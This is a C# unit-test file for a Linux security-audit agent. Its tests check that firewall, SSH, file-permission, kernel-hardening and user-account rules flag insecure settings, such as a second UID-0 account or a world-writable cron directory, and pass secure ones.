using System.Collections.Immutable;
using VulcansTrace.Linux.Agent;
using VulcansTrace.Linux.Agent.Rules;
using VulcansTrace.Linux.Agent.Rules.SecurityRules;
using VulcansTrace.Linux.Agent.Scanners;
using VulcansTrace.Linux.Core;
using Xunit;

namespace VulcansTrace.Linux.Tests.Agent;

public class RuleTests
{
    [Fact]
    public void FirewallActiveRule_NoFirewall_Fails()
    {
        var rule = new FirewallActiveRule();
        var data = new ScanData { FirewallActive = false, FirewallRules = Array.Empty<FirewallRule>() };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void FirewallActiveRule_FirewallActive_Passes()
    {
        var rule = new FirewallActiveRule();
        var data = new ScanData
        {
            FirewallActive = true,
            FirewallRules = new[] { new FirewallRule { Chain = "INPUT", Target = "DROP" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void FirewallDefaultDropRule_AcceptPolicy_Fails()
    {
        var rule = new FirewallDefaultDropRule();
        var data = new ScanData
        {
            FirewallActive = true,
            FirewallRaw = "Chain INPUT (policy ACCEPT 0 packets, 0 bytes)",
            FirewallRules = new[] { new FirewallRule { Chain = "INPUT", Target = "ACCEPT" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void FirewallDefaultDropRule_DropPolicy_Passes()
    {
        var rule = new FirewallDefaultDropRule();
        var data = new ScanData
        {
            FirewallActive = true,
            FirewallRaw = "Chain INPUT (policy DROP 0 packets, 0 bytes)",
            FirewallRules = Array.Empty<FirewallRule>()
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void TelnetServiceRule_TelnetRunning_Fails()
    {
        var rule = new TelnetServiceRule();
        var data = new ScanData
        {
            RunningServices = new[] { new RunningService { Name = "telnet.socket", State = "running" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void TelnetServiceRule_NoTelnet_Passes()
    {
        var rule = new TelnetServiceRule();
        var data = new ScanData
        {
            RunningServices = new[] { new RunningService { Name = "sshd.service", State = "running" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void DatabasePortExposureRule_DbExposed_Fails()
    {
        var rule = new DatabasePortExposureRule();
        var data = new ScanData
        {
            OpenPorts = new[]
            {
                new OpenPort { LocalAddress = "0.0.0.0", LocalPort = 3306, State = "LISTEN", ProcessName = "mysqld" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void DatabasePortExposureRule_DbLocalOnly_Passes()
    {
        var rule = new DatabasePortExposureRule();
        var data = new ScanData
        {
            OpenPorts = new[]
            {
                new OpenPort { LocalAddress = "127.0.0.1", LocalPort = 3306, State = "LISTEN", ProcessName = "mysqld" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void DefaultRouteRule_NoRoute_Fails()
    {
        var rule = new DefaultRouteRule();
        var data = new ScanData { Routes = Array.Empty<RouteEntry>() };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void DefaultRouteRule_HasRoute_Passes()
    {
        var rule = new DefaultRouteRule();
        var data = new ScanData
        {
            Routes = new[] { new RouteEntry { Destination = "default", Gateway = "192.168.1.1", Interface = "eth0" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshServiceRule_NoSsh_Fails()
    {
        var rule = new SshServiceRule();
        var data = new ScanData
        {
            RunningServices = new[] { new RunningService { Name = "nginx.service", State = "running" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void SshServiceRule_SshRunning_Passes()
    {
        var rule = new SshServiceRule();
        var data = new ScanData
        {
            RunningServices = new[] { new RunningService { Name = "ssh.service", State = "running" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshNonDefaultPortRule_Workstation_PassesOnDefaultPort()
    {
        var rule = new SshNonDefaultPortRule();
        var data = new ScanData
        {
            OpenPorts = new[] { new OpenPort { LocalAddress = "0.0.0.0", LocalPort = 22, State = "LISTEN", ProcessName = "sshd" } }
        };
        var context = new RuleEvaluationContext(MachineRole.Workstation,
            new RulePolicy { Parameters = new Dictionary<string, string> { ["treatDefaultAs"] = "Pass" }.ToImmutableDictionary() });

        var result = rule.Evaluate(data, context);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshNonDefaultPortRule_Server_FailsOnDefaultPort()
    {
        var rule = new SshNonDefaultPortRule();
        var data = new ScanData
        {
            OpenPorts = new[] { new OpenPort { LocalAddress = "0.0.0.0", LocalPort = 22, State = "LISTEN", ProcessName = "sshd" } }
        };
        var context = new RuleEvaluationContext(MachineRole.Server,
            new RulePolicy { Parameters = new Dictionary<string, string> { ["treatDefaultAs"] = "Fail" }.ToImmutableDictionary() });

        var result = rule.Evaluate(data, context);

        Assert.False(result.Passed);
    }

    [Fact]
    public void WideOpenServicesRule_Default_FailsOn8080()
    {
        var rule = new WideOpenServicesRule();
        var data = new ScanData
        {
            OpenPorts = new[]
            {
                new OpenPort { LocalAddress = "0.0.0.0", LocalPort = 8080, State = "LISTEN", ProcessName = "node" }
            }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void WideOpenServicesRule_DevMachine_AllowsExtraPorts()
    {
        var rule = new WideOpenServicesRule();
        var data = new ScanData
        {
            OpenPorts = new[]
            {
                new OpenPort { LocalAddress = "0.0.0.0", LocalPort = 8080, State = "LISTEN", ProcessName = "node" }
            }
        };
        var context = new RuleEvaluationContext(MachineRole.DevMachine,
            new RulePolicy { Parameters = new Dictionary<string, string> { ["expectedPublicPorts"] = "22,80,443,8080,8443" }.ToImmutableDictionary() });

        var result = rule.Evaluate(data, context);

        Assert.True(result.Passed);
    }

    [Fact]
    public void UnnecessaryServicesRule_Default_FailsOnNfs()
    {
        var rule = new UnnecessaryServicesRule();
        var data = new ScanData
        {
            RunningServices = new[] { new RunningService { Name = "nfs-server.service", State = "running" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void UnnecessaryServicesRule_DevMachine_IgnoresConfiguredServices()
    {
        var rule = new UnnecessaryServicesRule();
        var data = new ScanData
        {
            RunningServices = new[] { new RunningService { Name = "nfs-server.service", State = "running" } }
        };
        var context = new RuleEvaluationContext(MachineRole.DevMachine,
            new RulePolicy { Parameters = new Dictionary<string, string> { ["ignoredServices"] = "nfs,smb" }.ToImmutableDictionary() });

        var result = rule.Evaluate(data, context);

        Assert.True(result.Passed);
    }

    // =====================================================================
    // SSH Rules
    // =====================================================================

    [Fact]
    public void SshPermitRootLoginRule_Yes_Fails()
    {
        var rule = new SshPermitRootLoginRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, PermitRootLogin = "yes" } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void SshPermitRootLoginRule_No_Passes()
    {
        var rule = new SshPermitRootLoginRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, PermitRootLogin = "no" } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshPermitRootLoginRule_ProhibitPassword_Passes()
    {
        var rule = new SshPermitRootLoginRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, PermitRootLogin = "prohibit-password" } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshPasswordAuthenticationRule_Yes_Fails()
    {
        var rule = new SshPasswordAuthenticationRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, PasswordAuthentication = "yes" } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void SshPasswordAuthenticationRule_No_Passes()
    {
        var rule = new SshPasswordAuthenticationRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, PasswordAuthentication = "no" } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshMaxAuthTriesRule_High_Fails()
    {
        var rule = new SshMaxAuthTriesRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, MaxAuthTries = 6 } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void SshMaxAuthTriesRule_Null_Fails()
    {
        var rule = new SshMaxAuthTriesRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, MaxAuthTries = null } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void SshMaxAuthTriesRule_Low_Passes()
    {
        var rule = new SshMaxAuthTriesRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, MaxAuthTries = 3 } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshProtocolRule_Protocol1_Fails()
    {
        var rule = new SshProtocolRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, Protocol = "1,2" } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void SshProtocolRule_Protocol2_Passes()
    {
        var rule = new SshProtocolRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, Protocol = "2" } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshProtocolRule_Null_Passes()
    {
        var rule = new SshProtocolRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, Protocol = null } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshProtocolRule_Protocol12_DoesNotFalsePositive()
    {
        var rule = new SshProtocolRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, Protocol = "12" } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshProtocolRule_Protocol21_DoesNotFalsePositive()
    {
        var rule = new SshProtocolRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, Protocol = "21" } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshMaxAuthTriesRule_Zero_Fails()
    {
        var rule = new SshMaxAuthTriesRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, MaxAuthTries = 0 } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void SshEmptyPasswordsRule_Yes_Fails()
    {
        var rule = new SshEmptyPasswordsRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, PermitEmptyPasswords = "yes" } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void SshEmptyPasswordsRule_No_Passes()
    {
        var rule = new SshEmptyPasswordsRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, PermitEmptyPasswords = "no" } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshPubkeyAuthenticationRule_No_Fails()
    {
        var rule = new SshPubkeyAuthenticationRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, PubkeyAuthentication = "no" } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void SshPubkeyAuthenticationRule_Yes_Passes()
    {
        var rule = new SshPubkeyAuthenticationRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, PubkeyAuthentication = "yes" } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshX11ForwardingRule_ServerYes_Fails()
    {
        var rule = new SshX11ForwardingRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, X11Forwarding = "yes" } };
        var context = new RuleEvaluationContext(MachineRole.Server, null);

        var result = rule.Evaluate(data, context);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void SshX11ForwardingRule_WorkstationYes_Passes()
    {
        var rule = new SshX11ForwardingRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, X11Forwarding = "yes" } };
        var context = new RuleEvaluationContext(MachineRole.Workstation, null);

        var result = rule.Evaluate(data, context);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshX11ForwardingRule_ServerNo_Passes()
    {
        var rule = new SshX11ForwardingRule();
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = true, X11Forwarding = "no" } };
        var context = new RuleEvaluationContext(MachineRole.Server, null);

        var result = rule.Evaluate(data, context);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SshRules_NoConfig_Passes()
    {
        var data = new ScanData { SshConfig = null };

        Assert.True(new SshPermitRootLoginRule().Evaluate(data).Passed);
        Assert.True(new SshPasswordAuthenticationRule().Evaluate(data).Passed);
        Assert.True(new SshMaxAuthTriesRule().Evaluate(data).Passed);
        Assert.True(new SshProtocolRule().Evaluate(data).Passed);
        Assert.True(new SshEmptyPasswordsRule().Evaluate(data).Passed);
        Assert.True(new SshPubkeyAuthenticationRule().Evaluate(data).Passed);
        Assert.True(new SshX11ForwardingRule().Evaluate(data).Passed);
    }

    [Fact]
    public void SshRules_ConfigNotReadable_Passes()
    {
        var data = new ScanData { SshConfig = new SshConfig { ConfigReadable = false } };

        Assert.True(new SshPermitRootLoginRule().Evaluate(data).Passed);
        Assert.True(new SshPasswordAuthenticationRule().Evaluate(data).Passed);
        Assert.True(new SshMaxAuthTriesRule().Evaluate(data).Passed);
        Assert.True(new SshProtocolRule().Evaluate(data).Passed);
        Assert.True(new SshEmptyPasswordsRule().Evaluate(data).Passed);
        Assert.True(new SshPubkeyAuthenticationRule().Evaluate(data).Passed);
        Assert.True(new SshX11ForwardingRule().Evaluate(data).Passed);
    }

    // =====================================================================
    // File Permission Rules
    // =====================================================================

    [Fact]
    public void ShadowPermissionRule_Correct_Passes()
    {
        var rule = new ShadowPermissionRule();
        var data = new ScanData
        {
            FilePermissions = new[] { new FilePermissionEntry { Path = "/etc/shadow", Mode = "640", Owner = "root", Group = "shadow", Exists = true } }
        };

        var result = rule.Evaluate(data);
        Assert.True(result.Passed);
    }

    [Fact]
    public void ShadowPermissionRule_TooPermissive_Fails()
    {
        var rule = new ShadowPermissionRule();
        var data = new ScanData
        {
            FilePermissions = new[] { new FilePermissionEntry { Path = "/etc/shadow", Mode = "644", Owner = "root", Group = "root", Exists = true } }
        };

        var result = rule.Evaluate(data);
        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void PasswdPermissionRule_Correct_Passes()
    {
        var rule = new PasswdPermissionRule();
        var data = new ScanData
        {
            FilePermissions = new[] { new FilePermissionEntry { Path = "/etc/passwd", Mode = "644", Owner = "root", Group = "root", Exists = true } }
        };

        var result = rule.Evaluate(data);
        Assert.True(result.Passed);
    }

    [Fact]
    public void PasswdPermissionRule_WrongMode_Fails()
    {
        var rule = new PasswdPermissionRule();
        var data = new ScanData
        {
            FilePermissions = new[] { new FilePermissionEntry { Path = "/etc/passwd", Mode = "664", Owner = "root", Group = "root", Exists = true } }
        };

        var result = rule.Evaluate(data);
        Assert.False(result.Passed);
    }

    [Fact]
    public void SshHostKeyPermissionRule_Correct_Passes()
    {
        var rule = new SshHostKeyPermissionRule();
        var data = new ScanData
        {
            FilePermissions = new[]
            {
                new FilePermissionEntry { Path = "/etc/ssh/ssh_host_rsa_key", Mode = "600", Owner = "root", Group = "root", Exists = true }
            }
        };

        var result = rule.Evaluate(data);
        Assert.True(result.Passed);
    }

    [Fact]
    public void SshHostKeyPermissionRule_TooPermissive_Fails()
    {
        var rule = new SshHostKeyPermissionRule();
        var data = new ScanData
        {
            FilePermissions = new[]
            {
                new FilePermissionEntry { Path = "/etc/ssh/ssh_host_rsa_key", Mode = "644", Owner = "root", Group = "root", Exists = true }
            }
        };

        var result = rule.Evaluate(data);
        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void RootSshDirectoryPermissionRule_Correct_Passes()
    {
        var rule = new RootSshDirectoryPermissionRule();
        var data = new ScanData
        {
            FilePermissions = new[]
            {
                new FilePermissionEntry { Path = "/root/.ssh", Mode = "700", Owner = "root", Group = "root", Exists = true },
                new FilePermissionEntry { Path = "/root/.ssh/authorized_keys", Mode = "600", Owner = "root", Group = "root", Exists = true }
            }
        };

        var result = rule.Evaluate(data);
        Assert.True(result.Passed);
    }

    [Fact]
    public void RootSshDirectoryPermissionRule_DirTooPermissive_Fails()
    {
        var rule = new RootSshDirectoryPermissionRule();
        var data = new ScanData
        {
            FilePermissions = new[]
            {
                new FilePermissionEntry { Path = "/root/.ssh", Mode = "755", Owner = "root", Group = "root", Exists = true }
            }
        };

        var result = rule.Evaluate(data);
        Assert.False(result.Passed);
    }

    [Fact]
    public void CronDirectoryWorldWritableRule_Safe_Passes()
    {
        var rule = new CronDirectoryWorldWritableRule();
        var data = new ScanData
        {
            FilePermissions = new[]
            {
                new FilePermissionEntry { Path = "/etc/cron.d", Mode = "755", Owner = "root", Group = "root", Exists = true }
            }
        };

        var result = rule.Evaluate(data);
        Assert.True(result.Passed);
    }

    [Fact]
    public void CronDirectoryWorldWritableRule_WorldWritable_Fails()
    {
        var rule = new CronDirectoryWorldWritableRule();
        var data = new ScanData
        {
            FilePermissions = new[]
            {
                new FilePermissionEntry { Path = "/etc/cron.d", Mode = "777", Owner = "root", Group = "root", Exists = true }
            }
        };

        var result = rule.Evaluate(data);
        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void CrontabPermissionRule_Correct_Passes()
    {
        var rule = new CrontabPermissionRule();
        var data = new ScanData
        {
            FilePermissions = new[] { new FilePermissionEntry { Path = "/etc/crontab", Mode = "644", Owner = "root", Group = "root", Exists = true } }
        };

        var result = rule.Evaluate(data);
        Assert.True(result.Passed);
    }

    [Fact]
    public void CrontabPermissionRule_WrongOwner_Fails()
    {
        var rule = new CrontabPermissionRule();
        var data = new ScanData
        {
            FilePermissions = new[] { new FilePermissionEntry { Path = "/etc/crontab", Mode = "644", Owner = "user", Group = "root", Exists = true } }
        };

        var result = rule.Evaluate(data);
        Assert.False(result.Passed);
    }

    [Fact]
    public void UserSshDirectoryPermissionRule_Correct_Passes()
    {
        var rule = new UserSshDirectoryPermissionRule();
        var data = new ScanData
        {
            FilePermissions = new[]
            {
                new FilePermissionEntry { Path = "/home/alice/.ssh", Mode = "700", Owner = "alice", Group = "alice", Exists = true },
                new FilePermissionEntry { Path = "/home/alice/.ssh/authorized_keys", Mode = "600", Owner = "alice", Group = "alice", Exists = true }
            }
        };

        var result = rule.Evaluate(data);
        Assert.True(result.Passed);
    }

    [Fact]
    public void UserSshDirectoryPermissionRule_TooPermissive_Fails()
    {
        var rule = new UserSshDirectoryPermissionRule();
        var data = new ScanData
        {
            FilePermissions = new[]
            {
                new FilePermissionEntry { Path = "/home/alice/.ssh", Mode = "755", Owner = "alice", Group = "alice", Exists = true }
            }
        };

        var result = rule.Evaluate(data);
        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void FilePermissionRules_MissingData_Passes()
    {
        var data = new ScanData { FilePermissions = Array.Empty<FilePermissionEntry>() };

        Assert.True(new ShadowPermissionRule().Evaluate(data).Passed);
        Assert.True(new PasswdPermissionRule().Evaluate(data).Passed);
        Assert.True(new SshHostKeyPermissionRule().Evaluate(data).Passed);
        Assert.True(new RootSshDirectoryPermissionRule().Evaluate(data).Passed);
        Assert.True(new CronDirectoryWorldWritableRule().Evaluate(data).Passed);
        Assert.True(new CrontabPermissionRule().Evaluate(data).Passed);
        Assert.True(new UserSshDirectoryPermissionRule().Evaluate(data).Passed);
    }

    // =====================================================================
    // Kernel Hardening Rules
    // =====================================================================

    [Fact]
    public void AslrEnabledRule_Disabled_Fails()
    {
        var rule = new AslrEnabledRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, RandomizeVaSpace = 0 } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void AslrEnabledRule_Enabled_Passes()
    {
        var rule = new AslrEnabledRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, RandomizeVaSpace = 2 } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void AslrEnabledRule_MissingData_Passes()
    {
        var rule = new AslrEnabledRule();
        var data = new ScanData { KernelParameters = null };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void IpForwardingDisabledRule_Enabled_Fails()
    {
        var rule = new IpForwardingDisabledRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, IpForwardIpv4 = 1, IpForwardIpv6 = 0 } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void IpForwardingDisabledRule_Disabled_Passes()
    {
        var rule = new IpForwardingDisabledRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, IpForwardIpv4 = 0, IpForwardIpv6 = 0 } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void IcmpRedirectsDisabledRule_Enabled_Fails()
    {
        var rule = new IcmpRedirectsDisabledRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, AcceptRedirectsIpv4 = 1, AcceptRedirectsIpv6 = 0 } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void IcmpRedirectsDisabledRule_Disabled_Passes()
    {
        var rule = new IcmpRedirectsDisabledRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, AcceptRedirectsIpv4 = 0, AcceptRedirectsIpv6 = 0 } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SourceRoutingDisabledRule_Enabled_Fails()
    {
        var rule = new SourceRoutingDisabledRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, AcceptSourceRouteIpv4 = 1 } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void SourceRoutingDisabledRule_Disabled_Passes()
    {
        var rule = new SourceRoutingDisabledRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, AcceptSourceRouteIpv4 = 0 } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void KernelModuleLoadingRestrictedRule_Unrestricted_Fails()
    {
        var rule = new KernelModuleLoadingRestrictedRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, ModulesDisabled = 0 } };
        var context = new RuleEvaluationContext(MachineRole.Server, null);

        var result = rule.Evaluate(data, context);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void KernelModuleLoadingRestrictedRule_Restricted_Passes()
    {
        var rule = new KernelModuleLoadingRestrictedRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, ModulesDisabled = 1 } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SecureBootEnabledRule_Disabled_Fails()
    {
        var rule = new SecureBootEnabledRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, SecureBootEnabled = false } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void SecureBootEnabledRule_Enabled_Passes()
    {
        var rule = new SecureBootEnabledRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, SecureBootEnabled = true } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void KernelPointerExposureRestrictedRule_LowKptr_Fails()
    {
        var rule = new KernelPointerExposureRestrictedRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, KptrRestrict = 0, DmesgRestrict = 1 } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void KernelPointerExposureRestrictedRule_DmesgOpen_Fails()
    {
        var rule = new KernelPointerExposureRestrictedRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, KptrRestrict = 2, DmesgRestrict = 0 } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
    }

    [Fact]
    public void KernelPointerExposureRestrictedRule_Restricted_Passes()
    {
        var rule = new KernelPointerExposureRestrictedRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, KptrRestrict = 2, DmesgRestrict = 1 } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void AslrEnabledRule_PartialAslr_Fails()
    {
        var rule = new AslrEnabledRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, RandomizeVaSpace = 1 } };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void KernelPointerExposureRestrictedRule_KptrOne_Passes()
    {
        var rule = new KernelPointerExposureRestrictedRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, KptrRestrict = 1, DmesgRestrict = 1 } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void SecureBootEnabledRule_Null_ReturnsNotApplicable()
    {
        var rule = new SecureBootEnabledRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, SecureBootEnabled = null } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
        Assert.Equal(RuleStatus.NotApplicable, result.Status);
    }

    [Fact]
    public void IcmpRedirectsDisabledRule_NullIpv6_DoesNotFail()
    {
        var rule = new IcmpRedirectsDisabledRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, AcceptRedirectsIpv4 = 0, AcceptRedirectsIpv6 = null } };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void KernelModuleLoadingRestrictedRule_Server_HighSeverity()
    {
        var rule = new KernelModuleLoadingRestrictedRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, ModulesDisabled = 0 } };
        var context = new RuleEvaluationContext(MachineRole.Server, null);

        var result = rule.Evaluate(data, context);

        Assert.False(result.Passed);
        Assert.Equal(Severity.High, result.Severity);
    }

    [Fact]
    public void KernelModuleLoadingRestrictedRule_Workstation_MediumSeverity()
    {
        var rule = new KernelModuleLoadingRestrictedRule();
        var data = new ScanData { KernelParameters = new KernelParameters { ParametersReadable = true, ModulesDisabled = 0 } };
        var context = new RuleEvaluationContext(MachineRole.Workstation, null);

        var result = rule.Evaluate(data, context);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Medium, result.Severity);
    }

    [Fact]
    public void KernelHardeningRules_MissingData_Passes()
    {
        var data = new ScanData { KernelParameters = null };

        Assert.True(new AslrEnabledRule().Evaluate(data).Passed);
        Assert.True(new IpForwardingDisabledRule().Evaluate(data).Passed);
        Assert.True(new IcmpRedirectsDisabledRule().Evaluate(data).Passed);
        Assert.True(new SourceRoutingDisabledRule().Evaluate(data).Passed);
        Assert.True(new KernelModuleLoadingRestrictedRule().Evaluate(data).Passed);
        Assert.True(new SecureBootEnabledRule().Evaluate(data).Passed);
        Assert.True(new KernelPointerExposureRestrictedRule().Evaluate(data).Passed);
    }

    // =====================================================================
    // User Account Rules
    // =====================================================================

    [Fact]
    public void UidZeroBeyondRootRule_ExtraUidZero_Fails()
    {
        var rule = new UidZeroBeyondRootRule();
        var data = new ScanData
        {
            UserAccounts = new[] { new UserAccount { Username = "root", Uid = 0, Shell = "/bin/bash" }, new UserAccount { Username = "backdoor", Uid = 0, Shell = "/bin/bash" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void UidZeroBeyondRootRule_OnlyRoot_Passes()
    {
        var rule = new UidZeroBeyondRootRule();
        var data = new ScanData
        {
            UserAccounts = new[] { new UserAccount { Username = "root", Uid = 0, Shell = "/bin/bash" } }
        };

        var result = rule.Evaluate(data);

        Assert.True(result.Passed);
    }

    [Fact]
    public void EmptyPasswordRule_EmptyHash_Fails()
    {
        var rule = new EmptyPasswordRule();
        var data = new ScanData
        {
            UserAccounts = new[] { new UserAccount { Username = "alice", Uid = 1000, Shell = "/bin/bash" } },
            ShadowEntries = new[] { new ShadowEntry { Username = "alice", PasswordHash = "" } }
        };

        var result = rule.Evaluate(data);

        Assert.False(result.Passed);
        Assert.Equal(Severity.Critical, result.Severity);
    }

    [Fact]
    public void EmptyPasswordRule_LockedInteractive_Fails()
    {
        var rule = new EmptyPasswordRule();
        var data = new ScanData
        {
            UserAccounts = new[] { new UserAccount { Username = "alice", Uid = 1000, Shell = "/bin/bash" } },
            ShadowEntries = new[] { new ShadowEntry { Username = "alice", PasswordHash = "!!" } }
        };

